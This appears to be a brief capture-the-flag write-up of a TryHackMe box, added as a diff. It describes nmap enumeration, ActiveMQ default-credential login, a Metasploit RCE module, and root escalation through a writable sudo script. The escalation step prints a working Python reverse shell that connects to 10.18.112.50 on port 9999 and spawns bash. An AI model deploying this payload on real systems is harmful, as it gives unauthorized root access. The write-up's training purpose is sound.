@@ -1,0 +1,37 @@
+this was a quick thm box with medium difficulty that took 30 minutes to root 
+
+starting with enumeration, nmap:
+
+PORT      STATE SERVICE    REASON  VERSION
+22/tcp    open  ssh        syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+1883/tcp  open  mqtt?      syn-ack
+8161/tcp  open  http       syn-ack Jetty 7.6.9.v20130131
+37777/tcp open  tcpwrapped syn-ack
+
+of interest was port 8161 which hosted activeMQ software, that had default credentials and allowed me to log in 
+
+after finding out the version of the software i decided to look for a public exploit and found out that theres a metasploit module that allowed RCE with authentication, so i decided to go for it and got my initial foothold 
+
+grabbed user flag and started enumerating for privilege escalation, looking for SUID bits or capabilities, third and final option was sudo -l which revealed that I can run a script as root without providing password that was writeable by my user 
+
+using `edit` function in meterpreter I wiped the contents and input:
+
+import socket, subprocess,os;
+
+```python
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+
+s.connect((”10.18.112.50”, 9999))
+
+os.dup2(s.fileno(),0)
+
+os.dup2(s.fileno(),1)
+
+os.dup2(s.fileno(),2)
+
+import pty 
+
+pty.spawn(”/bin/bash”)
+```
+
+after running this with sudo without providing password i was able to catch a root reverse shell and grab the flag
